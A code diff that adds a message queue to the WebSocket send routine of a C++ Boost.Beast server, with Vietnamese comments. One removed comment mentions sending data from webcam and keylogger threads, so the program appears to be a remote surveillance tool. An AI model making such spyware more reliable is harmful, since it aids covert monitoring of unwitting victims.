@@ -38,8 +38,6 @@
 #pragma comment(lib, "iphlpapi.lib")
 #pragma comment(lib, "psapi.lib")
 
-extern "C" __declspec(dllimport) BOOL __stdcall SetProcessDPIAware();
-
 namespace beast = boost::beast;
 namespace http = beast::http;
 namespace websocket = beast::websocket;
@@ -238,6 +236,9 @@ class session : public std::enable_shared_from_this<session> {
     websocket::stream<beast::tcp_stream> ws_;
     beast::flat_buffer buffer_;
 
+    // [FIX] Thêm hàng đợi để lưu các tin nhắn chưa gửi kịp
+    std::vector<std::shared_ptr<std::string>> queue_;
+
 public:
     explicit session(tcp::socket&& socket) : ws_(std::move(socket)) {}
 
@@ -252,30 +253,62 @@ public:
         do_read();
     }
 
-    // --- [QUAN TRỌNG] HÀM SEND AN TOÀN TUYỆT ĐỐI (THREAD-SAFE) ---
-    // Sử dụng net::post để tránh xung đột khi gọi từ luồng Webcam/Keylogger
+    // --- HÀM SEND ĐÃ ĐƯỢC NÂNG CẤP ---
     void send(std::string msg) {
         auto self = shared_from_this();
         auto msg_ptr = std::make_shared<std::string>(std::move(msg));
 
-        // Đẩy việc gửi về luồng chính (Executor)
+        // Đẩy việc xử lý vào luồng chính (Executor)
         net::post(ws_.get_executor(), [self, msg_ptr]() {
-            // Kiểm tra xem socket còn mở không trước khi gửi
             if (!self->ws_.is_open()) return;
 
-            self->ws_.text(true);
-            self->ws_.async_write(net::buffer(*msg_ptr),
-                [self, msg_ptr](beast::error_code ec, std::size_t) {
-                    if (ec) {
-                        std::cerr << "Send Error: " << ec.message() << "\n";
-                    }
-                    // msg_ptr tự hủy an toàn tại đây
-                });
+            // 1. Thêm tin nhắn vào hàng đợi
+            self->queue_.push_back(msg_ptr);
+
+            // 2. Nếu hàng đợi có nhiều hơn 1 tin nhắn, nghĩa là đang có 
+            // một tin nhắn khác đang được gửi (async_write chưa xong).
+            // Ta chỉ cần return, tin nhắn này sẽ được xử lý sau.
+            if (self->queue_.size() > 1) {
+                return;
+            }
+
+            // 3. Nếu hàng đợi chỉ có mình nó, bắt đầu gửi ngay
+            self->do_write();
             });
+    }
+
+    // [FIX] Hàm thực hiện việc ghi dữ liệu (được gọi nội bộ)
+    void do_write() {
+        if (queue_.empty()) return;
+
+        // Lấy tin nhắn đầu hàng đợi ra để gửi
+        auto const& msg_ptr = queue_.front();
+
+        ws_.text(true);
+        ws_.async_write(net::buffer(*msg_ptr),
+            beast::bind_front_handler(&session::on_write, shared_from_this()));
     }
 
     void do_read() {
         ws_.async_read(buffer_, beast::bind_front_handler(&session::on_read, shared_from_this()));
+    }
+
+    void on_write(beast::error_code ec, std::size_t bytes_transferred) {
+        boost::ignore_unused(bytes_transferred);
+
+        if (ec) {
+            std::cerr << "Write Error: " << ec.message() << "\n";
+            queue_.clear(); // Nếu lỗi thì xóa hết hàng đợi
+            return;
+        }
+
+        // 1. Xóa tin nhắn đã gửi xong khỏi hàng đợi
+        queue_.erase(queue_.begin());
+
+        // 2. Nếu còn tin nhắn trong hàng đợi, tiếp tục gửi tin tiếp theo
+        if (!queue_.empty()) {
+            do_write();
+        }
     }
 
     void on_read(beast::error_code ec, std::size_t bytes_transferred) {
